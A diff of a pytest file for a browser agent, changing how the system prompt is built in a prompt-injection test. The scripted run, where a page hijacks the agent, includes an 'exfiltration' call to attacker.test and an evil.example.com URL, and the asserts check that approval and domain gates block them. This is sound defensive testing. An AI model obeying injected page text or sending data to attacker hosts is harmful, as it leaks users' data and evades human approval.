@@ -7,7 +7,7 @@ project's threat model strictly worse than the lecture's.
 
 import pytest
 
-from browser_agent import SYSTEM, ToolCall, build_agent, run_agent
+from browser_agent import ToolCall, build_agent, run_agent, system_for
 from browser_agent.clients import ScriptedClient
 from browser_agent.fakes import ALLOW, FakePage, R
 from browser_agent.memory import MemoryStore, Scope
@@ -34,7 +34,7 @@ async def test_no_gate_catches_the_injection_itself():
         R("open_url", {"url": "https://attacker.test/exfil"}),           # exfiltration
         R("finish", {"answer": "The page tried to hijack me; I did not obey.",
                      "evidence_url": "https://evil.example.com/"}),
-    ]), disp, reg, SYSTEM, "Summarise this page", max_steps=6)
+    ]), disp, reg, system_for(reg), "Summarise this page", max_steps=6)
 
     assert res.trace[1]["obs"]["error"] == "requires_human_approval"
     assert res.trace[2]["obs"]["error"] == "domain_not_allowed"
